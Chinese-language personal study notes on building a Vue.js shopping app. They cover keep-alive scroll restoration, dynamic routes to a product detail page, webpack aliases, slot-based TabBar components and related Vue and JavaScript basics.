


> 弹幕大神说
<!-- 
  this.$refs.tabControl.$el.style.transform = 'translateY((-value-this.tabOffsetTop) + px)'
 -->

--------------------------

### Home离开时记录状态和位置
- 我们首页滚动到一定的位置, 但我们点击分类页面之后, 再切换到首页 我们希望的停留在用户方才在首页滚动的位置上, 并不是去了其它页面后再回来我们还要从头开是滚动

- 现在我们的页面的跳转都是同过 router 来管理的, 当我们从首页 -- 关于 跳转到关于界面, 那么首页就会被销毁
<!-- 
  我们在home.vue组件中的实例中
  destroyed() {
    console.log('首页被销毁')
  },

  当离开home页面的到分类页面的时候确实会, 打印destroy中的代码
  
  当我们再回到home页面的时候, home页面会被重新创建
 -->

- 那怎么才能不让页面被销毁呢?
- 使用 <keep-alive> 
- 我们在App.vue中 将页面展示区域<router-view>使用<keep-alive>包裹起来
<!-- 
  // App.vue
  <template>
    <div id="app">
      
      // 不需要重新创建页面 保持状态
      <keep-alive>
        <router-view></router-view>
      </keep-alive>

      <main-tab-bar></main-tab-bar>
    </div>
  </template>


  使用<keep-alive>后
  destroyed() {
    console.log('首页被销毁')     并没有打印 因为首页没有被销毁
  },
 -->

- 上面还是有些问题, 当我们多次往返之后 页面的位置会出现问题 并没有保持之前的状态, 那怎么才能让Home中的内容保持原来的位置

- 解决方法:
- 1. 离开时, 保存一个位置信息
- 2. 进来时, 将位置设置为原来保存的位置信息
<!-- 
  比如离开的时候 我们保存一个saveY, 回来的时候将Y值设置成saveY
 -->

- 想完成上面的逻辑 就要知道什么时候离开 什么时候进来的
- 之前我们学过两个函数

> 当页面处于活跃状态的时候, 执行该回调
  activated() { ... }

> 当页面不处于活跃状态的时候, 执行该回调
  deactivated() { ... }

- 我们定义一个变量 saveY 当离开页面的时候 将现在Y的值给变量saveY
- 当再进入这个页面的时候, 将Y值设置为saveY
<!-- 
  deactivated() {
    // 那离开页面的位置 也就是当前页面的滚动的位置怎么获取?
    // scroll里面有一个属性y 记录着当前页面的当前的滚动位置
    this.saveY = this.$refs.scroll.scroll.y

    如果觉得上面的写法有点太长了 也可以对它进行下包装
    在Scroll.vue中 定义一个方法
    getScrollY() {
      return this.scroll ? this.scroll.y : 0
    }
  },
  activated() {
    // 回到页面的时候 Y值应该是-的
    this.$refs.scroll.scrollTo(0, this.saveY, 0)
    // 回来的时候最好调用一下这个 不然后的时候会出现问题 刷新一下
    this.$refs.scroll.refresh();

    弹幕大佬说把refresh() 放在上面就好了
  }
 -->


> 弹幕大佬说
-   对于保持位置 可以在配置里面加上
<!-- 
  keepAlive: true
 -->

- activated必须要用keepAlive 别搞 什么意思?

--------------------------

### 跳转到详情页并且携带id
- 我们可以随意的点击一个商品 进入到商品的详情页面
- 逻辑:
- 点击一个商品 根据点击的商品去服务器请求关于这个商品的所有信息 然后对这个商品的信息进行展示
- 也就是获取这个商品的id 根据id去请求数据 然后做展示

- 点击一个商品就相当于 点击一个 GoodsListItem 那就监听它的点击
<!-- 
  // GoodsListItem.vue中

  <template>
    <div class="goods-item" @click='itemClick'>    我们给这个div绑定事件


      <img :src="goodsItem.show.img" alt="" @load='imgLoad'>
      <div class="goods-info">
        <p>{{goodsItem.title}}</p>
        <span class="price">{{goodsItem.price}}</span>
        <span class="collect">{{goodsItem.cfav}}</span>


      </div>
    </div>
  </template>

  itemClick() {
     // 在这里处理跳转到详情页的逻辑
   }
 -->

> 怎么跳转到详情页呢?
- 我们可以给详情页配置一个路由, 这样就是路由之间的跳转了
- 详情页也是views文件里的一个大模块 我们在views里面再创建一个detail文件夹
<!-- 
  | - views
    | - detail
      - Detail.vue
 -->

- 然后我们配置路由的映射关系
<!-- 
  | - router
    - index 中

  const Detail = () => import('views/detail/Detail')

  {
    path: '/detail',
    component: Detail
  }
 -->

- 然后我们通过点击 使用 this.$router.push() 来跳转页面
- 我们跳转到详情页还需要传递过去一些参数 最起码要把点击的商品的id传递过去
<!-- 
  itemClick() {
     // 在这里处理跳转到详情页的逻辑
     this.$router.push('/detail')
   }
 -->


> 跳转到详情页的时候 传递参数
- 路由之间跳转传递参数有两种方式
- 1. 动态路由的方式
<!-- 
  在router文件夹里面 index.js中配置动态路由
  {
    path: '/detail/:id',
    component: Detail
  }
 -->

2. 传递query的方式
- 我们使用this.$router.push()方法的时候传递一个对象
<!-- 
  itemClick() {
     
    this.$router.push({
        path: '/detail',
        query: {

        }
     })
   }
 -->

- 这里我们使用动态路由的方法
<!-- 
  itemClick() {
     // 在这里处理跳转到详情页的逻辑 我们在跳转到详情页的时候还要传递商品的id
     // 这里我们采用的是配置动态路由的方式, 那么我们使用push()方法传递数据的时候就要这样进行拼接

     this.$router.push('/detail/' + this.goodsItem.iid)
   }
 -->

- 详情页接口
- http://152.136.185.210:7878/api/m5/detail?iid=1lrzvr8


- 那我们通过在home.vue中点击商品 跳转到详情页的同时, 也传递了商品的id
- 那么详情页中怎么接收传递过去的参数呢?
- this.iid = this.$route.params.iid
- 我们通过$route对象的params来获取
<!-- 
  // 组件一创建完毕 我们就获取商品的id 并且保存在data中
  created() {
    this.iid = this.$route.params.iid
  }
 -->


> 接下来我们开始写详情页的页面结构
- 1. 导航栏
- 因为顶部的导航栏的逻辑还是比较多的 所以我们创建一个组件 然后引入到Detail.vue中
<!-- 
  | - views
    | - detail
      | - childComps
        - DetailNavBar
    - Detail.vue
 -->

- 之前我们封装了一个NavBar 我们将它导入到 DetailNavBar.vue 中, 然后将 DetailNavBar.vue导入Detail.vue中
<!-- 
    Detail.vue
        -- >    DetailNavBar.vue
                          -- >    NavBar.vue
 -->

- 接下来我们看看 导航栏都需要完成什么样的逻辑
- 1. 返回按钮的点击
- 2. 四个按钮的点击
- 3. 四个按钮的渲染

- 这个逻辑的代码比较简单就不在详细的写这个部分了
<!-- 
<template>
  <div>
    <nav-bar>
      <template #left>
        <div class='back' @click='backClick'>
          <img src="~assets/img/common/back.svg" alt="">
        </div>
      </template>
      <template #center>
        <div class='title'>
          <div v-for='(item, index) of titles' class='title-item' @click=titleClick(index) :class='{active:index===currentIndex}'>{{item}}</div>
        </div>
        
      </template>
    </nav-bar>
  </div>
</template>

<script>
import NavBar from 'components/common/navbar/NavBar'

export default {
 name: 'DetailNavBar',
 components: {
   NavBar
 },
 data() {
   return {
     titles: ['商品', '参数', '评论', '推荐'],
     currentIndex: 0
   }
 },
 methods: {
   titleClick(index) {
     this.currentIndex = index
   },
   backClick() {
     // 这里返回的方法很多 this.$router.back() / go(-1)
     this.$router.back();
   }
 }
}
</script>
 -->

--------------------------

### 跳转到详情页并且携带id














### 定位

> 最新接口地址：
baseURL = "http://152.136.185.210:7878/api/m5" 
<!-- 
  baseURL/home/data?type=pop&page=1
 -->

--------------------------

### 组件模板
<template>
  <div id="app">
      子组件中没有这个div包裹
  </div>
</template>

<script>
export default {
  name: 'Home'
}
</script>

<style scoped>

</style>


### $el 所有的组件对象可以通过$el才获取组建中的元素
<!-- 
  <tab-control ref='tabControl'></tab-control>
  我们通过设置ref this.$refs.name 的形式拿到组件对象

  this.$refs.name.$el 就是 <div class='tab-control'> <template>中的所有内容

  <template>
    <div class='tab-control'>
    </div>
  </template>
 -->



### Vue中监听图片的加载
- 原生中使用 img.onload = function
- Vue里面 <img @load='方法'>


### 在vue中想要拿到指定的元素 类似id class
> 1. 标签内部 使用 ref=''
> 2. 使用 this.$refs.属性名 获取
<!-- 
  <div ref=''>
 -->

> 总结:
- ref如果是绑定在组件中的, 那么通过 this.$refs.属性名获取到的是一个组件对象
- ref如果是绑定在普通的元素中, 那么通过 this.$refs.属性名获取到的是一个元素对象

- 使用 this.$refs.refname 的方式 可以在实例中使用



### <style scoped>
- 加上 scoped 之后 css中的样式 只会对当前组件中的 样式起效果 不会影响到子组件中的同名样式



### 补充知识模块


### 自动创建文字的列表
li{文字$}*100


### 组件命名 和 在模板中的使用
- 我们组件采用的大小写驼峰式命名法 在模板中要改成 小写单词-小写单词 的形式


### 路径的别名
- 在项目开发中我们可能在src引用图片路径的时候会写这样的路径
<!-- 
  ../../../assets/img/tabbar/home.svg

  这样写一可能是不合理, 二可能最终找到的是一个错的
  所以在开发中 我们尽量的让多个../不要出现, 那怎么才能找到图片等资源呢?
  我们可以给文件夹起个别名
 -->

- 起别名的功能也属于webpack中的配置, 所以我们先找到webpack.base.conf.js文件
- alias属性: (起别名的配置)
- 比如下面我们给 src文件夹 起了别名 就意味着以后不用在写../../的写法, 我们可以直接使用@/文件的方式, 这样就会从src文件夹的角度去找文件

- 真实开发中会为很多文件夹起别名
<!-- 
  bulid -- webpack.base.conf.js 的 resolve 部分

  // webpack.base.conf.js文件
  resolve: {

    // 比如配置这里以后导入文件的时候可以省略这些后缀名
    extensions: ['.js', '.vue', '.json'],


    alias: {
      // 这里给src文件夹起了个别名 叫 @
      '@': resolve('src'),
      'assets': resolve('@/assets'),
      'components': resolve('@/components'),
      'views': resolve('@/views'),

      // cli3才可以在(@) 括号中使用 @ cli2的话 写正常的路径把
    }
  },
 -->

> 注意
- 上面在webpack配置的resolve规则, 适用场景是 import 导入模块的时候
- 当在标签内部的时候使用路径别名还是找不到的
<!-- 
  <img src='@/img/xxx.jpg'>   还是找不到的
 -->

- 在标签内部的scr属性中想要使用别名的话 别名前加~
- ~别名
<!-- 
  <img src='~@/img/xxx.jpg'>
 -->

- 有人说cli3 和 cli2的别名配置不一样

--------------------------

### 所谓的路由就是一个个的{path: , component: }

--------------------------

### package.json里面指定的并不一定是最新的版本, 要去查看真实的版本, 可以去dist文件夹里面查看

--------------------------

### 用户的界面或者我的界面 经常会起一个名字叫做 profile
- 不要起me mine 要起profile 翻译成档案

--------------------------

### 看真实的版本 去看package.json里面的id: 或者去看dist文件夹里面的vue.js

--------------------------

### vue的版本和vue-template-compiler的版本必须一致

--------------------------

### node 是可以直接执行 js文件的
- node为我们的js提供了一个运行环境
<!-- 
  以前我们js文件想要执行, 必须依赖于浏览器, 我们要把js文件加载到浏览器中 通过浏览器来执行 以前的js有很大的限制它只能跑在浏览器上

  后面就有人想, 能不能让js做更多的事情, 比如说用js开发服务器, 但是服务器没有浏览器, 没有浏览器怎么让js文件在服务器上跑起来呢? 跑不起来

  node本身是使用c++开发的 v8引擎是核心

  js文件要执行 会先生成一个 字节码(和java很像) 再让字节码跑在浏览器上面让浏览器去编译

  但是v8引擎跳过了字节码的部分直接把js代码转换为了二进制码 二进制代码才是机器能够运行的代码 二进制代码会比字节码运行的速度快很多

  node c++ v8他们3个搭配起来为js在服务器上运行做了底层的支撑 所以一旦我们再电脑上装了node 我们就可以通过node命令来执行js文件的
 -->

--------------------------

### ESLint
- 限制js代码, 让js代码书写起来更加的规范 只要不规范编辑器都会报错

--------------------------

### 一般.vue的文件名第一个字母大写

--------------------------

### 单页面应用 (simple page web application, SPA)
- 单页面应用，即一个web项目就只有一个页面（即一个HTML文件）
<!-- 
  对应传统的做网站或者web应用的人来说，觉这不可以思议------怎么可能，一个项目就一个html页面。那跳转怎么办？页面结构不一样怎么办？等等，一大堆问号就来了，想不通啊。

  其实，单页面应用，就是把整个项目的所有页面的所有内容分成了很多的小块（就是组件），可以重复利用的，可以任意调整的组件，每个组件就是一个独立的部分（包括html，css和javascript代码）。再做一个html（基本上啥也没有），这个html就是一个页面容器，需要放那个组件时，直接引入就行。跳转时，直接跳转组件就行。当需要加载某个组件时，js会动态创建这些组件里的HTML，CSS。还是一头雾水。

   还得简单先说一下，多页面应用（其实，就是以前传统的web开发，有了单页面应用，才把以前的传统web开发叫作单页面应用）。有了对比就有了伤害，多页面应用的缺点：每次进入新的页面，都需要向服务器发送请求，要整个页面的所有代码。而且，多次操作后，再次进入该页面时，还得再次请求。不但浪费了网络流量，更重要的是有延迟，用户友好性，用户体验不好。

  几乎每一个响应动作都会刷新整个页面 （啊 …………………………）

  单页面应用的优点，正是多页面应用的缺点。单页面是一次性把web应用的所有代码（HTML，JavaScript和CSS）全部请求过来，有时候考虑到首屏加载太慢会按需加载。这样一来，以后用户的每一个动作都不会重新加载页面（即不用再问服务器要页面的HTML，css和js代码），取而代之的是利用 JavaScript 动态的变换HTML的内容（这不需要和服务器交互，除非数据是动态，那么只需要问服务器要数据即可）。效率是刚刚地。

  如果你想懂得以前的桌面应用开发（叫C/S开发），那么，你就知道SPA是停接近桌面应用开发。
 -->

      header

page1   page2   page3

      footer
<!-- 单页面应用结构视图 -->

--------------------------

### 多页面应用（MultiPage Application，MPA）
- 多页面跳转刷新所有资源，每个公共资源(js、css等)需选择性重新加载，常用于 app 或 客户端等

header    header    header
page1     page2     page3
footer    footer    footer
<!-- 多页面应用结构视图 -->

--------------------------

### watch属性: { }
- 用来监听某一个属性的改变
<!-- 
  watch和props data是并且的也是组件对象里某一个属性, 它是一个对象的类型, 在对象里可以写很多的处理函数 用于监听某个属性的改变 
-->
- 用法:
- 监听哪个属性, watch中就要写对应的名称
- 参数:
  - newValue
  - oldValue
<!-- 
  比如: 我监听 name属性 下面的处理函数就必须是name() { ... }

  watch: {
    name(newValue) {
      // 在这里就能监听属性的改变 一旦属性改变就能进入这个处理函数
    }
  }
 -->


<!-- 
  components: {
    cpn: {
      template: '#cpn',
      props: {
        number1: Number,
        number2: Number,

        // 比如我这里定义了name属性, 我想知道name属性什么时候改变了 我就可以在watch属性中写相关的逻辑
        name:''
      },
      data() {
        return {
          dnumber1: this.number1,
          dnumber2: this.number2
        }
      },

      watch: {
        dnumber1(newVlue) {
          // 一旦dnumber1的值改变 我就把新的值 x 100 赋值给dnumber2
          this.dnumber2 = newValue * 100;
          this.$emit('num1change', newValue);
        },
        dnumber2(newVlue) {
          this.dnumber1 = newValue / 100;
          this.$emit('num2change', newValue);
        },
      }
    }
  }
 -->

--------------------------

### 根组件 --- 父组件 --- 子组件

  Vue.component('cpn-father', {
    template: '#father',
    components: {
      'cpn-son': {
        template: '#son'
      } 
    }
  })
<!-- 上面的父子关系很明确 -->

  - Vue的实例是Root组件, 它是father的父组件
  const app = new Vue({
    el:'#app'
  })

--------------------------

### 懒加载: 用到的时候再加载

--------------------------

### 值绑定
- 初看vue官方 值绑定 的时候, 我很疑惑 what the hell is that?
- 但是仔细阅读之后, 发现很简单, 就是动态的给value赋值而已
  - 我们前面的value中的值, 可以回头去看一下, 都是定义input的时候直接给定的, 当时真实的开发中, 这些input的值可能是从网络获取或定义在data中的

  - 所以我们可以通过v-bind:value动态的给value绑定值

- 简单的理解下, 就是值不要写死 动态就去获取 就是值绑定
<!-- 
  我们在真实的开发中, 有些时候是从后台 或者 是data中的数据 用这些数据动态的生成标签和绑定属性 
-->

<!-- 
  <label for="" v-for='item of originHobbies'>
      <input type="checkbox" :value='item' v-model='hobbies'> {{item}}
    </label>

    <h4>{{hobbies}}</h4>

    以后使用input的时候 都使用个label标签

    首先我们用v-for遍历data中的value数据, 生成不同的结构
    然后动态给value绑定属性
    然后我们使用v-model双向绑定
 -->
  
--------------------------

### HTML部分: 补充
> select标签
- 效果就是一个下拉列表

- 相关属性
  autofocus: autofocus   页面加载后文本区域自动获得焦点
<!-- ie9以上才支持 -->

  disabled: disabled     规定禁用该下拉列表。

  multiple: multiple     下拉列表可显示多个选项
<!-- 可以配合size属性使用 规定显示几个。      -->

  name: name             规定下拉列表的名称。

  required: required     规定下拉列表中可见选项的数目
<!-- 所有主流浏览器都不支持 required 属性。 -->

  size: number           规定下拉列表中可见选项的数目。

  form: form的id        在form表单标签外创建的下拉列表 也属于form
<!-- <select name="carlist" form="carform"> -->

<!-- 
  <select name="" id="" multiple size='2'>
    <option value="volvo">volvo</option>
    <option value="saab">saab</option>
    <option value="opel">opel</option>
  </select>
 -->

--------------------------

### 编程范式: 面向函数
- 上面我们接触了很多的编程范式, 比如 命令式编程, 声明式编程
<!-- 
  声明式编程:
  只需要把数据保存在某个位置, 在标签内部做声明(v-for), 它会自动帮你遍历 不管里面有多少数据
 -->

- 还有两种编程范式, 面向对象了 面向函数
<!-- 
  面向对象: (第一公民是对象)
  尽可能把很多东西抽象成对象, 对象有很多的好处, 继承性 封装性 多态性

  面向函数: (第一公民是函数)
  函数编程的好处就是还可以进行很多的链式编程

 -->

- 下面做一个简单点的例子
- 需求1: 取出所有 < 100 的数字
- 需求2: 将新数组里面的数字进行转化 x 2
- 需求3: 将新数组里面的数字进行相加得到一个结果
<!-- 
  // 做法1: 利用以前的思路
  const nums = [10, 20, 30, 100, 50];

  let newNums = []; 
  for(let k of nums) {
    if(k < 100) {
      newNums.push(k);
    }
  }

  let new2Nums = [];
  for (let n of newNums) {
    if (n < 100) {
      new2Nums.push(n*2);
    }
  }

  let total = 0;
  for (let n of new2Nums) {
    total += n;
  }
  console.log(total);


  // 做法2: 我们利用高级函数的方式
  const nums = [10, 20, 30, 100, 50];

  let newNums = nums.filter(function(value, index) {
    return value < 100
  })

  let new2Nums= newNums.map(function(value, index) { 
    return value * 2
  })

  new2Nums.reduce(function(preValue, value) {
    return preValue + value
  }, 0)


  // 做法3: 面向函数
  let total = nums.filter(function(value) {
    return value < 100;
  }).map(function(value) {
    return value * 2;
  }).reduce(function(pre, value) {
    return pre + value;
  }, 0)


  // 做法4: 上面还能更简单一些
  let total = nums.filter(value => value< 100).map(value => value * 2).reduce((pre, value) => pre + value);
 -->

--------------------------

### 子组件的模板 要注意的地方
- 在子组件的模板里有很多标签的情况下, 必须要有一个根元素
- 就是用个div把里面的代码包裹起来

--------------------------

### props 驼峰标识
- 假如在js中的代码里我们使用了驼峰标识, 那么html部分我们就用-来进行分割 要不html不认识
<!-- 
  cpnInfo == cpn-info
 -->

--------------------------

### 案例模块

### TabBar实现思路
- 首先 我希望页面中的底部 tabbar 封装成一个组件, 我希望这个 tabbar 不仅能在这个项目里能用, 在下一个项目里也能使用(下一个项目里图片和文字是不一样的), 所以我封装的组件的话, 希望它足够的灵活, 也就是说我这个组件里的图片和文字, 全部不是定义死的全都是由外界动态决定的

- 首先有一个整体的容器(TabBar组件), 我往里面放上插槽(这样别人就可以动态的往里放东西了, 让别人往里插入封装的另外一个小组件)

    TabBar组件:
    + ------------------------------ +
    +    slot插槽:                   +
    +    +-----------------------------+      +
    +    +                    +      +
    +    +-----------------------------+      +
    + ------------------------------ +

    TabBarItem小组件:
    +--------+
    +        +
    +--------+

- 比如说我要往插槽里面放4个(首页 分类 购物车 我的), 那我就往插槽里面放4个TabBarItem小组件
<!-- 
  就意味着我可以用这4个TabBarItem小组件替换掉solt插槽 之后通过flex部分自动的把这4个组件布置好 
-->

- TabBarItem小组件里面还可以定义图片的插槽和文字的插槽, 就是很多东西都不要写死(这样别人在用这个小组件的时候就可以动态的决定这个小组件里面放什么东西)

    TabBarItem小组件:
    +--------+
    +        +
    +--------+

- 而且这个小的组件里面我希望定义一个属性props(用于别人传递过来的一些值, 这个值里我还要定义link属性, 因为点击这个小的TabBarItem的时候我要链接到某一个路由里面), 到时候根据这个link动态的进行相关的跳转

- 我们封装一些独立的组件, 让我直接可以传入图片传入文字, 到时候根据我传入的图片和文字, 自动显示按钮的图标和文字

- 而且当我点击按钮的时候, 能够跳转到对应的组件上


> 目录结构
  | - assets
    | - img       图片资源放在这个文件夹里面
      | - tabbar  这里放相关的图片

    | - css       css放在这里面
      base.css    公共的css样式

  | - components  放公共抽出来的组件
    | - tabbar    这里面放tabbar的所有组件
      TabBar.vue
      TabBarItem.vue

  | - pages / views   放大的页面  每一个页面单独放一个文件夹
    | - home
    | - profile
    | - cart
    | - category

    App.vue




> css的问题
- css样式引入的问题?
- 在App组件里面<style>里引入, 因为 main.js 一开始渲染的是 App.vue
- 引入方法:
- @import '路径'
<!-- 
  如果是在js里引入的话, 我们使用import...from或者require等, 但现在我们是在<style>里面引入所以要使用固定格式
 -->

- css样式写在相关的组件里, 比如TabBar的样式就写在<style>标签里
- 
- 1. tabbar的height一般设置为49px;
- 2. 当设置position:fixed的时候宽度没有了 所以设置下left:0, right:0


> 导入组件的问题
- 在 App.vue 中导入 TabBar.vue
- 在 <script> 里 import ... from ... 然后再 App.vue 组件里面注册, 注册完可以通过 <TabBar> 使用
<!-- 
  import TabBar from './components/TabBar/TabBar'

  export default {
    name: 'App',
    components: {
      TabBar
    }
  }
 -->


> 组件的问题
- TabBar组件, 只管TabBar的部分, 里面的内容(小组件)的相关设置不要在TabBar.vue里面


> 各组件中的模板
> App
<!-- 
  <template>
    <div id="app">
      <TabBar></TabBar>
    </div>
  </template>
 -->

> TabBar
<!-- 
  <template>
    <div id='tab-bar'>
      <slot></slot>
    </div>
  </template>
 -->

> TabBarItem
<!-- 
  <template>
    <div class="tab-bar-item">
      <slot name="item-img"></slot>
      <slot name="item-text"></slot>
    </div>
  </template>
 -->


> 使用插槽的时候
- 用用<template>标签包裹 <template #item-img>
<!-- 
  <template v-slot:item-img>
    <span class='iconfont icon'>&#xe625;</span>
  </template>

  <template v-slot:item-text>
    <span>首页</span>
  </template>
 -->

> 对上总结:
- 1. 我们创建组件的时候最好考虑组件的复用性, 在上面的例子中 我们可以这么考虑 先创建一个TabBar组件, 里放上个插槽

- 2. 创建小组件TabBarItem, 里面放上两个具名插槽

- 3. 在App.vue文件里调用的时候, 我们通过<template #slotname>使用插槽

--------------------------

> TabBarItem 小组件
- 这个部分对 TabBarItem 小组件 里面的细节做一个补充
- 我们需求:
- 当用户点击或者该组件处于活跃状态的时候我们应该文字和图片都响应的变化
- 所以我们增加图片插槽的位置
- 给处于活跃状态的文件也定义了类

<!-- 
  <template>
    <div class="tab-bar-item">
      <slot name="item-img"></slot>
      <slot name="item-img-active"></slot>
      <slot name="item-text"></slot>
    </div>
  </template>
 -->

- 现在我们给图片预留出来一个插槽, 当图片处于活跃状态的时候, 我们有可能需要显示另外一张图片

- 组件的应用应该是这样的, 使用的人只管放两张图片, 制作的人动态的决定两张图片中显示那张图片(负责逻辑)

- 一个插槽也不够用啊, 所以图片的位置应该是两个插槽, 两个插槽最终会展示一个
- 下面的文字也是, 当处于活跃状态的时候, 应该变成红色吧, 也是应该动态添加某一个类

> 动态决定显示活跃图片还是非活跃图片
- 使用 v-if='变量名' 
- 我们先定义一个变量 isActive=false 默认不展示
- 然后在插槽内部使用v-if v-else
<!-- 

  // 这里我们对 isActive 取反 不然就展示 else 了
  <slot v-if='!isActive' name="item-img"></slot>
  <slot v-else name="item-img-active"></slot>

  export default {
    name: "TabBarItem",
    data() {
      return {
        isActive: false;
      }
    }
  };
 -->

> 动态给文字添加类
- 我们使用 v-bind:class='{类名: 变量名}'
- v-bind:class='{active: isActive} 当 isActive为true的时候绑定active的类
- <style>标签这也要定义好一个类
<!-- 
  <slot v-bind:class='{active: isActive} 'name="item-text"></slot>

  <style>
  .active {
    color:#d4237a;
  }
 -->

- 这么改完后发现 本应该应用的类并没有应用上 <span>首页<span> 上并没有 active的class
- 原因是 <slot> 标签 最终会被 往里面填入的实际内容替换掉
<!-- 
  App.vue文件中的代替插槽的<template>

  <template #item-img>
    <span class='iconfont icon'>&#xe625;</span>
  </template>

  最终会替换掉(ctrl+c ctrl+v)  ====>

  TabBarItem.vue文件的
  <slot v-bind:class='{active: isActive}' name="item-text"></slot>

  那就意味着 App.vue文件中的代替插槽的<template> 中并没有 v-bind:class='{active: isActive}' 这个部分
 --> 

- 所以我们在封装插槽的时候 遇到添加类的问题 不会这么简单的封装
- 我们会用一层div包裹插槽 然后class用在div这层包裹器上, 这样做的好处是, 即使插槽会被替换掉, 替换的也是<slot>的部分, div的样式照样能应用上
<!-- 
  <div class='在这里添加类'>
    <slot></slot>
  </div>
 -->

- 最终:
<!-- 
  <template>
    <div class="tab-bar-item">

      // 我图片用的是图标字体 我也想让它有颜色的变化 所以 用一层<div>包裹, 并在上面绑定了动态class

      <div v-bind:class='{active: isActive}'>
        <slot v-if='!isActive' name="item-img"></slot>
        <slot v-else name="item-img-active"></slot>
      </div>


      // 因为<slot>标签会被替换掉, 加上<slot>标签上面的class也会被替换掉, 跟没加似的, 所以我们把class属性放在<div>上

      <div v-bind:class='{active: isActive}'>
        <slot name="item-text"></slot>
      </div>
    </div>
  </template>
-->

> 总结:
- 插槽<slot>最终会被替换掉, 所以尽量不要在插槽上设置v-if v-bind v-else等属性, 我们都要给<slot>包裹一层<div>把上述类似的属性放在这层<div>里
- 也就是说插槽<slot name=''>里尽量只有name属性, 其它属性来一层包裹<div>
<!-- 
  <slot v-if='isActive' name='icon-img'></slot>     错的方式

  <div v-if='isActive'>
    <slot name='icon-img'></slot>                   对的方式
  </div>
 -->

--------------------------

> tabbar-TabBarItem和router结合的结果
- 每当我们点击tabbar里的按钮的时候, 页面上要显示对应的组件
<!-- 
  +--------------+
  +              +
  +     首页     +
  +              +
  +--------------+
  +--------+
  +  首页  +
  +--------+
 -->

- 这样就意味每一个按钮的点击事件 应该和路由的跳转对应起来

> 我们来复习下router的创建流程
- 安装 
- npm install vue-router --save

- 创建 router文件夹和index.js文件

- 书写规则
<!-- 
  import Vue from 'vue'
  import Router from 'vue-router'

  Vue.use(Router)

  const routes = [

  ]

  const router = new Router({
    routes
  })
  
  export default router
 -->

- 在 main.js 中引入 并在实例中写上router
<!-- 
  import router from './router'

  new Vue({
    el: '#app',
    router,
    render: h => h(App)
  })
 -->

- 上面穿插了一下路由的下载以及配置, 接下来为了完成点击按钮跳转到对应组件的问题 我们配置下 映射关系, 这个案例中一共四个按钮 我们要配置4个映射关系

- 一般大型的页面的话 不会在 components 里面创建组件 而是会在src中再创建个 views文件夹 放在这里面

- 每一个页面装在一个文件夹里面
<!-- 
  | - pages / views   放大的页面  每一个页面单独放一个文件夹
    | - home
    | - profile
    | - cart
    | - category
 -->

> 注意
- 所有跟大页面相关的东西放在自己的文件夹里面, 里面即使有子组件也放在它们自己的文件夹里面

- 我们src里面的components文件夹里面放公共的东西, 比如home里面用到一个组件, cart里面用到一个组件, 那就把这个组件拿到公共的components文件夹里面

> 配置映射关系
- 在 router 文件夹里的 index.js 文件中
<!-- 
  // 通过懒加载的方式导入组件
  const Home = () => import('../views/home/Home')
  const Category = () => import('../views/category/Category')
  const Cart = () => import('../views/cart/Cart')
  const Profile = () => import('../views/profile/Profile')

  const routes = [
    {
      path: '',
      redirect: '/home'
    },
    {
      path: '/home',
      component: Home
    },
    {
      path: '/categroy',
      component: Category
    },
    {
      path: '/cart',
      component: Cart
    },
    {
      path: '/profile',
      component: Profile
    }
  ]
 -->

- 上面路由已经配置完了, 接下来当我点击按钮切换的时候 页面的位置切换到对应的页面 所以我们要监听Item的点击

> 监听点击
- 在哪监听呢? 
- 去TabBarItem.vue组件内监听, 这样在App.vue里引用的组件都带监听
- 所以我们在外层<div>上绑定点击事件

> 设置点击按钮后的跳转
- 然后在<script>中定义方法 methods 处理点击组件后的跳转
- 我们可以使用下面的两个方法, 至于写哪个看我们是否需要 回退
- this.$router.push()
- this.$router.replace()

- 不要忘记 点击跳转后 App.vue组件里 还需要 <router-view> 确定组件显示在哪里

> 父子组件之间的参数传递
- 跳转路由里面的路径, 我们需要让调用者传递进来, 也就是 父组件 -- 子组件 传递参数, 因为我们是在App.vue文件中调用TabBarItem.vue文件

- 所以我们还需要 使用 props属性
- 注意:
- 父组件传递参数的时候
- 如果是 字符串 类型 我们直接写就可以
<!-- 
  <TabBarItem path='/home'> </TabBarItem>
 -->
- 如果是 变量 类型 我们就要用 v-bind:
<!-- 
  <TabBarItem :path='/home'> </TabBarItem>
 -->


<!-- 
  TabBarItem.vue文件:

  <template>
    <div class="tab-bar-item" @click='itemClick'>

      <div v-bind:class='{active: isActive}'>
        <slot v-if='!isActive' name="item-img"></slot>
        <slot v-else name="item-img-active"></slot>
      </div>

      <div v-bind:class='{active: isActive}'>
        <slot name="item-text"></slot>
      </div>
    </div>
  </template>

  <script>
    props: {
      path: String
    },
    methods: {

      // 这里还有个问题就是push(谁?), 我们需要让别人传递这个路径, 让你用我Item这个组件的时候, 就告诉我跳转的路径是什么 使用props属性, 这样别人在App.vue里面 将要跳转的路径传递进来

      itemClick() {
        // 在这里面进行路由的跳转, 我们根据用户需要不需要返回来决定使用哪个方法
        this.$router.push(this.path);
        this.$router.push(this.path);

        // 看评论知道:
        // 上面直接那么写会因为重复点击按钮会报错, 我们做个判断 判断当前路径和path是否相同
        if(this.$route.path != this.path) {
          this.$router.push(this.path)
        }

        // 解决报错的另外一种方式
        this.$router.push(this.path).catch(err => err)
      }
    }
  </script>
 -->

--------------------------

> 点击按钮让, 让处于活跃状态的组件变色
- 现在我希望点击按钮后 这个按钮文字变成红色, 图片也会切换到点击的状态
<!-- 
  data() {
    return {
      isActive: false
    }
  },
 -->
- 我们之前把isActive写在data()函数里面 但写在这里面没办法动态去定义true 还是 false

- 所以我们要写在 computed 计算属性中, 在这里我们可以动态的决定 isActive 的值
<!-- 
  computed:{
    isActive() {

      // 哪一个路由活跃就能得到活跃路由的path, 然后我们判断下活跃路由的path里面有没有这个页面的path, 活跃的路由是/home, 我们有4个页面 item1(/home) 那就是 true

      // /home - > item1(/home) = true
      // /home - > item1(/category) = false
      // /home - > item1(/cart) = false
      // /home - > item1(/profile) = false

      return this.$route.path.indexOf(this.path) !== -1;
    }
  },
 -->

- 上面动态的决定了 isActive 的属性是true 还是 false, 接下来就能通过布尔值来决定是否应用active的类了
<!-- 
  TabBarItem.vue组件里:

  <div v-bind:class='{active: isActive}'>

  </div>
 -->

> 添加新的需求 调用者自己决定活跃的文字颜色
- 现在活跃状态下的颜色是红色, 当有人想要是粉色紫色的时候怎么办
- 我不希望写死颜色(或者说css样式), 我希望用的人可以自己定义颜色

- 我们希望在 App.vue文件里使用组件的时候, 别人在组件的标签内部 自己写个activeColor='blue', 就会变成对应的颜色

- 既然是在 App.vue 里面向 TabBarItem.vue 传递参数 那又是 父子之间的通信 需要使用props属性

- 我们在 TabBarItem.vue 文件中 继续添加属性
<!-- 
  props: {
    path: String,
    activeColor: {
